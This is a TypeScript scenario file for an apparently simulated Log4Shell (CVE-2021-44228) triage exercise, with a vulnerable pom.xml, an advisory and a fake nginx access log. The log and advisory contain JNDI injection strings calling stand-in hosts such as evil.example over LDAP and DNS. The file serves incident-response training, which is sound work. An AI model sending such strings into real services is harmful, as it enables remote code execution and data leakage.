import type { Scenario } from "../types";

export const log4shellJndi: Scenario = {
  slug: "log4shell-jndi",
  exhibit: "EXH-020",
  title: "${jndi:",
  tagline:
    "December 2021. A string in a log line should be inert. In Log4j 2.x, it is a remote code execution primitive, through LDAP, through your own logging pipeline.",
  category: "classic-history",
  difficulty: "intermediate",
  era: "2020s",
  year: "2021",
  estMinutes: 10,
  fictional: true,
  cwd: "/srv/payments-api",
  user: "responder",
  host: "prod-java-trace",
  role: "Platform engineer replaying December 10th: Maven coordinates, access logs, and the one-line patch.",
  objective:
    "Confirm vulnerable `log4j-core` on the classpath and find attacker probes in `access.log` using the JNDI lookup prefix.",
  briefing:
    "CVE-2021-44228, Log4Shell. This exhibit is triage: `pom.xml` plus nginx logs. No outbound LDAP from the museum terminal.",
  env: { USER: "responder", SHELL: "/bin/bash", PWD: "/srv/payments-api" },
  ps: ["  PID TTY TIME CMD", "  1 ?   0:01 systemd", "  420 ?   0:14 java -jar payments.jar"],
  history: ["pwd"],
  files: {
    "/srv/payments-api/pom.xml": {
      content: [
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
        "<project>",
        "  <artifactId>payments-api</artifactId>",
        "  <dependencies>",
        "    <dependency>",
        "      <groupId>org.apache.logging.log4j</groupId>",
        "      <artifactId>log4j-core</artifactId>",
        "      <version>2.14.1</version>",
        "    </dependency>",
        "  </dependencies>",
        "</project>",
      ].join("\n"),
    },
    "/srv/payments-api/ADVISORY.txt": {
      content: [
        "CVE-2021-44228, Apache Log4j2 JNDI injection",
        "",
        "Affected: Log4j 2.0-beta9 through 2.14.1 (fixed 2.15.0, further",
        "         hardening in 2.16.0 / 2.17.x)",
        "Vector: attacker-controlled input logged; message lookup enables",
        "        JNDI resolution → remote class loading",
        "Examples in logs:",
        "  ${jndi:ldap://host/a}",
        "  ${jndi:dns://host/a}",
        "",
        "Work: bump log4j, disable lookups via formatMsgNoLookups / env,",
        "      WAF temporary blocks on jndi: substrings",
      ].join("\n"),
    },
    "/var/log/nginx/access.log": {
      content: [
        '192.0.2.44 - - [10/Dec/2021:06:09:12 +0000] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://evil.example/x}"',
        '198.51.100.2 - - [10/Dec/2021:06:11:03 +0000] "GET /api/ping HTTP/1.1" 200 2 "-" "curl/7.68.0"',
        '203.0.113.9 - - [10/Dec/2021:07:02:18 +0000] "GET /?id=${jndi:dns://leak.example/q} HTTP/1.1" 200 120 "-" "python-requests/2.26"',
      ].join("\n"),
    },
  },
  steps: [
    {
      id: "advisory",
      goal: "Read the advisory summary.",
      hint: "`cat ADVISORY.txt`.",
      matches: [{ kind: "exact", command: "cat ADVISORY.txt" }],
      narration:
        "User input reaching Log4j's pattern resolver is the entire bug class. Fixed versions move fast because PoCs spread faster.",
    },
    {
      id: "pom",
      goal: "Confirm the Log4j artifact version.",
      hint: "`cat pom.xml`.",
      matches: [{ kind: "exact", command: "cat pom.xml" }],
      narration:
        "log4j-core 2.14.1, inside the vulnerable band. Every JVM service on this repo shares fate until the coordinates bump.",
    },
    {
      id: "grep-jndi",
      goal: "Search access logs for the telltale prefix.",
      hint: "`grep -nF jndi /var/log/nginx/access.log`.",
      matches: [{ kind: "exact", command: "grep -nF jndi /var/log/nginx/access.log" }],
      narration:
        "LDAP and DNS stager URLs in User-Agent and query strings, scanners and real actors used the same grammar. Block at the edge, patch at the library, assume keys rotated if anything executed.",
    },
  ],
  debrief: {
    summary:
      "Log4Shell (CVE-2021-44228), disclosed in December 2021, was a remote code execution vulnerability in Apache Log4j 2.x: specially crafted strings could trigger JNDI lookups that loaded attacker-controlled classes. Because nearly every Java service logs untrusted input, exposure was enormous. Apache released Log4j 2.15.0 within days; subsequent CVEs (e.g. DoS in 2.15) required further upgrades to 2.17.x.",
    lesson:
      "Logging is security-critical infrastructure, it parses, resolves, and sometimes retrieves untrusted data. Treat logging libraries with the same CVE SLAs as your web framework. WAF substring rules are triage, not therapy.",
    simulated: [
      "IPs and domains are documentation-only; artefact version ranges match Apache advisories.",
    ],
  },
};
